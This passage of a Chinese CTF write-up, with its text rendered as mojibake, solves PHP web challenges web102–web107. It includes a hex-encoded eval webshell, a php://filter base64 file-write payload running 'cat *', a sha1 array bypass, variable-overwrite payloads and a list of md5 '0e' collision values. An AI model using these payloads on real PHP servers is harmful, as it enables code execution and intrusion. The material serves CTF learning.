keyword">class</span> <span class="token class-name">hacker</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hackername</span> <span class="token operator">=</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span>    <span class="token keyword">const</span>  yn8rt<span class="token operator">=</span><span class="token string">'nb666'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">,</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//æœ‰è¿™ä¹ˆä¸€ä¸ªhackerç±»ï¼Œå‡è®¾æˆ‘ä»¬ä¸çŸ¥é“è¿™ä¸ªç±»æ˜¯å¹²ä»€ä¹ˆç”¨çš„ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ç±»é‡Œé¢çš„ä¿¡æ¯ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°ReflectionClassæ¥å¯¹ç±»è¿›è¡Œåå°„</span><span class="token comment" spellcheck="true">//ç°åœ¨æˆ‘å¯ä»¥é€šè¿‡åå°„æ¥è·å–è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•ï¼Œå±æ€§ï¼Œå¸¸é‡</span><span class="token comment" spellcheck="true">//é€šè¿‡åå°„è·å–ç±»çš„ä¿¡æ¯</span><span class="token variable">$reflection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å®ä¾‹åŒ–åå°„å¯¹è±¡,æ˜ å°„hackerç±»çš„ä¿¡æ¯</span><span class="token variable">$consts</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getConstants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è·å–æ‰€æœ‰å¸¸é‡</span><span class="token variable">$props</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è·å–æ‰€æœ‰å±æ€§</span><span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è·å–æ‰€æœ‰æ–¹æ³•</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$consts</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$props</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$methods</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¿”å›å€¼</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token string">"yn8rt"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"nb666"</span><span class="token punctuation">}</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">&amp;</span><span class="token function">object</span><span class="token punctuation">(</span>ReflectionProperty<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (2) {</span>    <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token string">"hackername"</span>    <span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"hacker"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">&amp;</span><span class="token function">object</span><span class="token punctuation">(</span>ReflectionMethod<span class="token punctuation">)</span><span class="token shell-comment comment">#3 (2) {</span>    <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"show"</span>    <span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"hacker"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ²¡æœ‰æŒ‡å®šæ–¹æ³•çš„è¯ï¼Œå°±ä¼šåƒé¢˜ç›®ä¸­é»˜è®¤è¾“å‡ºå¾ˆå¤šä¸œè¥¿ï¼š</p><p>1.å¸¸é‡ Contants<br>2.å±æ€§ Property Names<br>3.æ–¹æ³• Method Namesé™æ€<br>4.å±æ€§ Static Properties<br>5.å‘½åç©ºé—´ Namespace<br>6.Personç±»æ˜¯å¦ä¸ºfinalæˆ–è€…abstract<br>7.Personç±»æ˜¯å¦æœ‰æŸä¸ªæ–¹æ³•</p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// è¿™é‡Œçš„æ„æ€æ˜¯ä»ç¬¬äºŒä½å¼€å§‹æˆªå–</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// å›è°ƒå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè°ƒç”¨çš„å‡½æ•°ï¼Œå…¶ä½™çš„ä¸ºè°ƒç”¨å‚æ•°çš„å€¼</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-string-substr.html" target="_blank" rel="noopener">PHP substr() å‡½æ•°</a></p><p><a href="https://www.runoob.com/php/func-string-hex2bin.html" target="_blank" rel="noopener">PHP hex2bin() å‡½æ•°</a>ï¼šå‚æ•°åªæœ‰ä¸€ä¸ªï¼Œå°†ä¼ å…¥çš„å‚æ•°(16è¿›åˆ¶è½¬æ¢ä¸ºasciiå­—ç¬¦)</p><p>é¦–å…ˆè¿˜æ˜¯èµ‹å€¼ä¸andçš„ä¼˜å…ˆçº§é—®é¢˜ï¼Œæ‰€ä»¥å°±è¦ä¿è¯v2ä¼ å…¥çš„å€¼ä¸ºç»è¿‡is_numericå‡½æ•°åˆ¤æ–­åè¿”å›çš„ç»“æœä¸ºtrueï¼Œç„¶åå°±æ˜¯åˆ©ç”¨å›è°ƒå‡½æ•°æ¥å®ç°è¯»å–æ“ä½œ</p><p>æ‰€ä»¥å°±å¯ä»¥è¿™ä¹ˆåˆ©ç”¨å•Šï¼š</p><p><code>post:v1=hex2bin</code></p><p><code>getï¼š?v2=0x3c3f706870206576616c28245f504f53545b27796e275d293b3f3e&amp;v3=yn.php</code></p><p>ä¸Šé¢çš„16è¿›åˆ¶è§£ç asciiï¼š<code>&lt;?php eval($_POST[&#39;yn&#39;]);?&gt;</code></p><p>ä½†æ˜¯æœ‰ä¸ªä»€ä¹ˆé—®é¢˜ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token string">"0x66"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// åœ¨php5ä¸­è¿”å›å€¼ä¸ºtrue</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token string">"0x66"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// åœ¨php7ä¸­è¿”å›å€¼ä¸ºfalse</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†æ˜¯æœ¬é¢˜çš„ç¯å¢ƒå°±æ˜¯php7å•Š</p><h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>åˆ©ç”¨base64ï¼ŒåŒæ—¶é…åˆä¼ªåè®®å»å†™å…¥ï¼Œä½†æ˜¯éœ€è¦ä¿è¯é€šè¿‡is_numberå‡½æ•°çš„åˆ¤æ–­ï¼Œå¯ä»¥æœ‰å­—æ¯å•Šï¼Œä½†æ˜¯å¿…å¾—æ˜¯eå•Šï¼Œä¹Ÿå°±æ˜¯ç§‘å­¦è®¡æ•°æ³•å•Šï¼Œæ¥è‡ªåŒä¸€å®¶çš„payloadå•Šï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// PD89YGNhdCAqYDs=</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//è¿™é‡Œç›´æ¥ç”¨å»æ‰=çš„base64</span>è¾“å‡º   <span class="token number">5044383959474e6864434171594473</span>å¸¦eçš„è¯ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œå¯ä»¥é€šè¿‡is_numericæ£€æµ‹ã€‚å¤§å®¶å¯ä»¥å°è¯•ä¸‹å»æ‰<span class="token operator">=</span>å’Œå¸¦ç€<span class="token operator">=</span>çš„base64è§£ç å‡ºæ¥çš„å†…å®¹æ˜¯ç›¸åŒçš„ã€‚å› ä¸ºç­‰å·åœ¨base64ä¸­åªæ˜¯èµ·åˆ°å¡«å……çš„ä½œç”¨ï¼Œä¸å½±å“å…·ä½“çš„æ•°æ®å†…å®¹ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</code></p><p>postï¼šv1=hex2bin</p><p>ç„¶åè®¿é—®1.phpå»è§¦å‘å°±å¯ä»¥äº†</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªåœ°æ–¹çš„çš„åŒ¹é…ä¼¼ä¹æ¯«æ— æ„ä¹‰ï¼Œåªæ˜¯ä¸ºäº†è®©å†™å…¥çš„æ–‡ä»¶ä¸­æ²¡æœ‰phpï¼Œä½†æ˜¯æ ¹æ®ä¸Šä¸€ä¸ªé¢˜ç›®çš„payloadæ¥çœ‹ï¼Œä¹Ÿä¸éœ€è¦phpæ ‡ç­¾å•Š</p><h2 id="web104ã€web106"><a href="#web104ã€web106" class="headerlink" title="web104ã€web106"></a>web104ã€web106</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡æœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢çš„è¯ï¼Œsha1æ˜¯æ— æ³•è¯†åˆ«æ•°ç»„çš„ï¼Œç›´æ¥å°±æ˜¯æ•°ç»„ç»•è¿‡äº†</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string">'ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string">'æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"your are good"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å˜é‡è¦†ç›–</p><p>é¦–å…ˆè®©$key=sucesé‚£ä¹ˆ$$key=$sucesï¼Œç„¶å$value=flagé‚£ä¹ˆ$$value=$flagï¼Œåˆ°è¿™é‡Œå°±è¦†ç›–æˆåŠŸäº†ï¼Œä¹Ÿå°±æ˜¯$suces=$flag</p><p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯die($error)æ¥å®ç°çš„è¾“å‡ºï¼Œæ‰€ä»¥è®©$key=erroré‚£ä¹ˆ$$key=$errorï¼Œ$value=sucesé‚£ä¹ˆ$$value=$sucesï¼Œä¹Ÿå°±æ˜¯$error=$suces=$flagï¼ŒåŒæ—¶åˆå› ä¸ºä¸æ»¡è¶³if(!($_POST[â€˜flagâ€™]==$flag))ï¼Œæ‰€ä»¥dieè¢«æ‰§è¡Œï¼Œå¾—åˆ°flag</p><p><strong>payload</strong><code>?suces=flagï¼Œpostï¼šerror=suces</code></p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-string-parse-str.html" target="_blank" rel="noopener">PHP parse_str() å‡½æ•°</a></p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šå¯é€‰ã€‚è§„å®šå­˜å‚¨å˜é‡çš„æ•°ç»„åç§°ã€‚è¯¥å‚æ•°æŒ‡ç¤ºå˜é‡å­˜å‚¨åˆ°æ•°ç»„ä¸­ã€‚</p><p>åˆ©ç”¨md5ç¢°æ’ï¼šä½¿å¾—v1ä¸­çš„flag=0ï¼Œç„¶åv3=0(md5(QNKCDZO)=0eâ€¦)</p><p>payloadï¼š<code>vl=flag=0ï¼Œv3=QNKCDZO)</code></p><p>md5å¼±ç¢°æ’ï¼š</p><pre class="line-numbers language-php"><code class="language-php">0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š<span class="token constant">QNKCDZO</span><span class="token number">0e830400451993494058024219903391</span><span class="token number">240610708</span><span class="token number">0e462097431906509019562988736854</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1184209335a<span class="token number">0e072485820392773389523109082030</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s532378020a<span class="token number">0e220463095855511507588041205815</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s878926199a<span class="token number">0e545993274517709034328855841020</span><span aria-hidden="true" 